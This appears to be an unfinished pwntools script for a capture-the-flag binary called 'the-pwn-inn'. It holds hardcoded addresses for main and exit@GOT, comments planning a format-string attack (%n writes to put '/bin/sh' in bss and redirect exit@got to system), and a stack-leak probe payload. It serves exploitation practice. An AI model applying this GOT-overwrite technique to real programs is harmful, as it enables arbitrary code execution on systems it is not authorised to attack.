#!/usr/bin/python
import sys
import struct
from pwn import *

context.log_level = 'error'

#e = ELF("./the-pwn-inn")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#p = process(e.path)
#p = gdb.debug(e.path, gdbscript=open('script.gdb', 'r').read())

#print(f"Received: {p.recvline()}")

deadcode = p64(0xdeadc0dedeadc0de)
# libc_so_string = p64(0x400535)

# Using %s will cause it to go to a memory address,
# grab the contents, and print them out
main_func = p64(0x401328)
exit_got  = p64(0x404058)

# Need to use %n to write /bin/sh to bss
# Need to use %n to overwrite exit@got with system@got
# Need to locate first argument to exit@got in memory,
# and overwrite it with the address of the bss segment

#payload = exit_got
payload = b"AAAA "
payload += b"%x %x %x %x %x %i"

#print(hexdump(payload))

#p.sendline(payload)
sys.stdout.buffer.write(payload)
